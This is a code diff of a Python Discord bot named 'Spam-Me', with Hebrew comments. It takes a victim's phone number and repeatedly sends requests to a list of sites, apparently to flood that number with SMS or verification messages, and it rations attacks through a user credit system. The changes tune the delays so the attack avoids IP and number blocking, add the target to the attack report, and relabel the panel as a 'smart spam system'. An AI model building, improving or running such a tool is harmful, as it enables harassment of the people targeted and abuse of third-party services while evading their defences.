@@ -11,7 +11,7 @@ from flask import Flask
 from threading import Thread
 from datetime import datetime
 
-# --- שרת Flask לשמירה על הבוט פעיל ---
+# --- שרת Flask לשמירה על הבוט פעיל בפורט של Render ---
 app = Flask('')
 @app.route('/')
 def home(): return "Bot Online"
@@ -23,7 +23,7 @@ def keep_alive():
     t = Thread(target=run_flask)
     t.start()
 
-# --- הגדרות ---
+# --- הגדרות בוט ---
 TOKEN = os.environ.get('DISCORD_TOKEN')
 ADMIN_ID = 1281295891579408418 
 
@@ -42,7 +42,7 @@ def get_random_name():
     last_names = ["Cohen", "Levi", "Mizrahi", "Peretz", "Biton", "Avraham"]
     return f"{random.choice(first_names)} {random.choice(last_names)}"
 
-# --- פונקציית התקיפה המעודכנת ---
+# --- פונקציית התקיפה המאוזנת (למניעת חסימות) ---
 async def start_attack(interaction, target, rounds):
     success_count = 0
     failed_count = 0
@@ -73,24 +73,27 @@ async def start_attack(interaction, target, rounds):
                 }
                 
                 if site["type"] == "json":
-                    res = requests.post(site["u"], json=site["d"], headers=h, timeout=2.0)
+                    res = requests.post(site["u"], json=site["d"], headers=h, timeout=3.0)
                 else:
-                    res = requests.post(site["u"], data=site["d"], headers=h, timeout=2.0)
+                    res = requests.post(site["u"], data=site["d"], headers=h, timeout=3.0)
                 
                 if res.status_code in [200, 201]:
                     success_count += 1
                 else:
                     failed_count += 1
                 
-                time.sleep(0.1) # דיליי מהיר אך יציב
+                # דיליי של 1.2 שניות למניעת חסימת ה-IP והמספר
+                time.sleep(1.2) 
             except:
                 failed_count += 1
         
-        time.sleep(0.5)
+        time.sleep(1.0)
 
-    embed = discord.Embed(title="📊 סיכום תקיפה", color=0x00ff00)
+    embed = discord.Embed(title="📊 סיכום תקיפה סופי", color=0x00ff00)
+    embed.add_field(name="📱 מטרה", value=target, inline=False)
     embed.add_field(name="✅ הצלחות", value=f"**{success_count}**", inline=True)
     embed.add_field(name="❌ נכשלו", value=f"**{failed_count}**", inline=True)
+    embed.set_footer(text="Spam-Me Reporter")
     await interaction.followup.send(embed=embed, ephemeral=True)
 
 # --- ממשק דיסקורד ---
@@ -101,13 +104,15 @@ class AttackModal(ui.Modal, title='🚀 Spam-Me Premium'):
     async def on_submit(self, interaction: discord.Interaction):
         uid = interaction.user.id
         try: needed = int(self.rounds.value)
-        except: return await interaction.response.send_message("❌ מספר לא תקין", ephemeral=True)
+        except: return await interaction.response.send_message("❌ הזן מספר תקין", ephemeral=True)
 
         if user_credits.get(uid, 0) < needed:
             return await interaction.response.send_message(f"❌ אין קרדיטים!", ephemeral=True)
         
         user_credits[uid] -= needed
-        await interaction.response.send_message(f"⚡ התקיפה החלה! בסיום תקבל דוח...", ephemeral=True)
+        await interaction.response.send_message(f"⚡ התקיפה החלה! בסיום יישלח דוח הצלחות.", ephemeral=True)
+        
+        # הרצה ב-loop כדי לא לתקוע את הבוט
         Thread(target=lambda: bot.loop.create_task(start_attack(interaction, self.phone.value, needed))).start()
 
 class AttackView(ui.View):
@@ -125,17 +130,17 @@ class AttackView(ui.View):
             return await interaction.response.send_message("❌ כבר לקחת היום!", ephemeral=True)
         user_credits[uid] = user_credits.get(uid, 0) + 5
         daily_claimed[uid] = today
-        await interaction.response.send_message("✅ +5 קרדיטים!", ephemeral=True)
+        await interaction.response.send_message("✅ קיבלת 5 קרדיטים!", ephemeral=True)
 
 @bot.event
 async def on_ready():
-    print(f'✅ {bot.user.name} Live!')
+    print(f'✅ {bot.user.name} Is Ready!')
     bot.add_view(AttackView())
 
 @bot.command()
 async def setup(ctx):
     if ctx.author.id == ADMIN_ID:
-        embed = discord.Embed(title="🔥 Spam-Me Panel", description="מערכת ספאם מהירה עם דוח תוצאות.", color=0xff0000)
+        embed = discord.Embed(title="🔥 Spam-Me Control Panel", description="מערכת ספאם חכמה למניעת חסימות.", color=0xff0000)
         await ctx.send(embed=embed, view=AttackView())
 
 @bot.command()
